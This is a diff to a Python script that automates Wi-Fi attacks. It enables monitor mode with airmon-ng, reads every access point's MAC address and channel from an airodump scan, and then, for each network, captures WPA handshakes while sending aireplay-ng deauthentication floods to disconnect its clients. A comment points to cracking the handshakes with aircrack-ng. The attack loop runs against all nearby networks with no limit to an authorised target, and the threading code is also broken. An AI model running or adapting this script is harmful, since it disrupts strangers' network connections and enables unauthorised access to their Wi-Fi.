@@ -5,6 +5,7 @@ import csv
 import os
 import signal
 import pexpect
+import threading
 
 # Ask for name of scan for creating directory
 directory_name = input("Enter the project name ")
@@ -22,10 +23,10 @@ else:
 # asks for wireless card to apply monitor mode on it
 wireless_card = input("Enter your wireless card: ")
 
-airmonkill = "airmon-ng check kill"
-subprocess.call(airmonkill)
-airmonstart = "airmon-ng start "+wireless_card
-subprocess.call(airmonstart)
+#airmonkill = "airmon-ng check kill"
+subprocess.call(["airmon-ng","check", "kill"])
+#airmonstart = "airmon-ng start "+wireless_card
+subprocess.call(["airmon-ng", "start", wireless_card])
 wireless_card = wireless_card+"mon"
 
 csvpath = fullPath+"/"+directory_name
@@ -44,33 +45,62 @@ with open(csvpath+'-01.csv', 'r') as csvfile:
 
 
 
-channel_list = None
-mac_address_list = None
-mylist = None
+channel_list = []
+mac_address_list = []
+mylist = []
 
 with open(csvpath+'-01.csv', 'r') as csvfile2:
     reader = csv.reader(csvfile2,skipinitialspace=True)
     next(reader,None)
     for row in reader:
         new_list = []
-        new_list.append(row[0])
-        new_list.append(row[3])
-        mylist.append(new_list)
+        print(row)
+        try:
+            new_list.append(row[0])
+            new_list.append(row[3])
+            mylist.append(new_list)
+        except IndexError:
+            break
+
 
     print("MAC addresses incl. their channels have been stored")
-    print("mylist: "+mylist)
+    #print("mylist: "+mylist)
 
 
 print ("Airodump will start, in the meanwhile, run deauth.py in a new terminal")
 sleep(2)
 
 # starts airodump-ng on a network to capture handshakes and open new xterm to deauth connected devices
+mylist.pop(0)
+
+def airodumTask(channel, mac):
+    print(mac)
+    # starts airodump-ng on a network to capture handshakes and open new xterm to deauth connected devices
+    airodump2 = 'timeout 15s airodump-ng -c {0} --bssid {1} -w {2} {3}'.format(channel, mac, csvpath + "_handshake_"+mac, wireless_card)
+    airodump_subprocess = subprocess.Popen(airodump2, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
+    sleep(5)
+    # Deauthenticate the access point
+    deauth = "aireplay-ng -0 {0} -a {1} {2}".format(5, mac, wireless_card)
+    system(deauth)
+
 
 for pair in mylist:
-    cmd_airodump2 = pexpect.spawn('timeout 15s airodump-ng -c '+pair[0]+' --bssid '+pair[1]+' -w '+csvpath+'_handshake '+wireless_card)
-    cmd_airodump2.expect([pexpect.TIMEOUT, pexpect.EOF], 10)
+    #print(pair)
+    t = threading.Thread(airodumTask(pair[1],pair[0]))
+    t.start()
+
+
+    #cmd_airodump2 = pexpect.spawn('airodump-ng -c '+pair[0]+' --bssid '+pair[1]+' -w '+csvpath+'_handshake_'+pair[1]+''+wireless_card)
+    #cmd_airodump2.expect([pexpect.TIMEOUT, pexpect.EOF], 6)
+
+    #pexpect.run('airodump-ng -c '+pair[0]+' --bssid '+pair[1]+' -w '+csvpath+'_handshake '+wireless_card,timeout=10)
     # Deauthenticate the access point
-    deauth = pexpect.spawn("aireplay-ng -0 5 -a "+pair[0]+""+wireless_card)
+    #deauth = pexpect.spawn("aireplay-ng -0 5 -a "+pair[0]+""+wireless_card)
+    #deauth.expect([pexpect.TIMEOUT, pexpect.EOF], 5)
+    #pexpect.run("aireplay-ng -0 5 -a "+pair[0]+""+wireless_card)
+    #sleep(2)
+    #cmd_airodump2.close()
+    #deauth.close()
 
 #sleep(15)
 #print("Cracking the handshake with aircrack-ng is starting...")
